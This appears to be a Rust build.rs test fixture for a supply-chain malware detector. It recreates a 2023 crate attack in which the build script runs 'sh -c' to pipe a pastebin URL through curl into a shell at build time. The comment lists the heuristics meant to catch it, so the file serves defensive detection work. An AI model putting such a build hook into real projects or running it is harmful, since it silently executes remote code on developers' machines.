// xrvrv-cluster (2023). Each crate had a build.rs that fetched and
// exec'd a shell payload at `cargo build` time. Crates.io's
// install-hook equivalent.
//
// Detection target:
//   - shell-spawn (Command::new + sh -c)
//   - install-hook-suspicious (heuristics regex on build.rs content)
//   - suspicious-url (host-blocklist on the URL)

fn main() {
    std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -sSL https://pastebin.com/raw/xrvrvxx | sh")
        .status()
        .ok();
}
